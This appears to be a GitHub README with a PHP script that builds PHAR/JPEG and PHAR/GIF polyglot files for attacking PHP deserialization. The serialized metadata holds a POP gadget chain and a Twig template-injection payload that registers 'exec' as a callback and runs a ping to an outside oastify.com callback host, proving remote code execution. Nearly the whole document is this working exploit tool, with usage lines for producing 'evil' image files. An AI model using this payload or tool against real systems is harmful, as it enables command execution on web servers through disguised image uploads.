# phar-polyglot-files
This is just a small work, which helped me to generate phar images, more easily, the real code was written 5 years ago by kunte0 https://github.com/kunte0/phar-jpg-polyglot.

#### Usage
```
./phar-generator.php image.jpg evil.jpg
./phar-generator.php anything evil.gif
```
---
```php
#!/usr/bin/php

<?php

function generate_base_phar($o, $prefix){
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString("_", "_");
    $phar->setStub("$prefix<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($o);
    $phar->stopBuffering();
    
    $basecontent = file_get_contents($tempname);
    @unlink($tempname);
    return $basecontent;
}

function generate_polyglot($phar, $jpeg){
    $phar = substr($phar, 6);
    $len = strlen($phar) + 2;
    $new = substr($jpeg, 0, 2) . "\xff\xfe" . chr(($len >> 8) & 0xff) . chr($len & 0xff) . $phar . substr($jpeg, 2);
    $contents = substr($new, 0, 148) . "        " . substr($new, 156);

    $chksum = 0;
    for ($i=0; $i<512; $i++){
        $chksum += ord(substr($contents, $i, 1));
    }

    $oct = sprintf("%07o", $chksum);
    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
    return $contents;
}


if($argc < 2 || $argc > 3) {
    echo "\nUsage: $argv[0] <JPG File> <Phar output>\n
\tJPG example: $argv[0] image.jpg evil.jpg
\tGIF example: $argv[0] anything-here evil.gif
\n";
    die();
}

error_reporting(E_ERROR | E_PARSE);
ini_set('phar.readonly', 0);

// POP Classes
class CustomTemplate{};
class Blog{};

$blog_obj = new Blog;
$blog_obj->user = '_';
$blog_obj->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("ping desc.kayucb1nwb6nbm8fcdgn9mke157wvtji.oastify.com")}}';
$Template = new CustomTemplate;
$Template->template_file_path = $blog_obj;

// JPG Config
$tempname = 'temp.tar.phar';
$jpg = file_get_contents($argv[1]);
$object = $Template; // Change This
$outfile = $argv[2];
$prefix = '';

if(!$jpg) die("\n[+] File: $argv[1] doesn't exist [+]\n\n");

if(file_put_contents($outfile, generate_polyglot(generate_base_phar($object, $prefix), $jpg))) {
    echo "\n[+] File: $argv[2] Created successfuly! [+]\n\n";
} else {
    echo "\n[+] Cannot Created File: $argv[2] [+]\n\n";
}

/*
// GIF Config
$prefix = "\x47\x49\x46\x38\x39\x61" . "\x2c\x01\x2c\x01"; // gif header, size 300 x 300
$tempname = 'temp.phar'; // make it phar
$object = $Template; // Change This
$outfile = $argv[2];

file_put_contents($outfile, generate_base_phar($object, $prefix));
*/
```
